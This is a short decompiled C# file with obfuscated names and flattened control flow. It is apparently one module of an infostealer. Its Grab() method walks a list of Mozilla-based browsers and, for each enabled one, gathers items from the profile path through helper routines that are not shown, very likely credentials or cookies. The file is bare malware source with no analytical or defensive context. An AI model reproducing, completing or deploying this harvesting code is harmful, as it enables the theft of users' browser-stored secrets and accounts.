using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using c1SUVJC;
using p3N5Y;

namespace ZAZUx;

public class Artrkwh67Ue : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string nfdEFcpTOy
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public Artrkwh67Ue()
	{
		nfdEFcpTOy = "";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		List<fAUNhG4wfK.VA9>.Enumerator enumerator = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				enumerator = fAUNhG4wfK.MozillaBrowserList.GetEnumerator();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			while (enumerator.MoveNext())
			{
				fAUNhG4wfK.VA9 current = enumerator.Current;
				if (current.f1yuVL)
				{
					list.AddRange(MRw.KUy0mI0a(MRw.pw7TE(current.UGX78vp8rG6), current.Xj2aIKPsZBi));
					list.AddRange(MRw.B9NSlpBkeG(MRw.pw7TE(current.UGX78vp8rG6), current.Xj2aIKPsZBi));
				}
			}
			return list;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}
}
